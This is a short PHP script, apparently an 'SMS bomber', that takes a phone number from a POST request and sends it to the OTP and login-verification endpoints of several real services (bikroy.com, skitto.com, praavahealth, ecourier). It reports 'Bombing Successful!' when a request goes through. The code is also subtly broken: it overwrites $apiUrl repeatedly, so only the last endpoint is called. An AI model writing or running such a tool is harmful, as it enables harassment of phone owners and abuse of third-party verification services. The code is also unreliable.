<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['phoneNumber'])) {
        $phoneNumber = $_POST['phoneNumber'];
        $apiUrl = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" . urlencode($phoneNumber);
        $apiUrl = "https://www.skitto.com/replace-sim/sent-otp/" . urlencode($phoneNumber);
        $apiUrl = "https://cms.beta.praavahealth.com/api/v2/user/login/?mobile=" . urlencode($phoneNumber);
        $apiUrl = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=" . urlencode($phoneNumber);
        $apiUrl = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" . urlencode($phoneNumber);
        
        $response = file_get_contents($apiUrl);
        
        if ($response !== FALSE) {
            // Successfully sent
            echo "Bombing Successful!";
        } else {
            // Error occurred
            http_response_code(500);
            echo "Error: Unable to send message.";
        }
    } else {
        http_response_code(400);
        echo "Error: Phone number not provided.";
    }
} else {
    http_response_code(405);
    echo "Error: Invalid request method.";
}
?>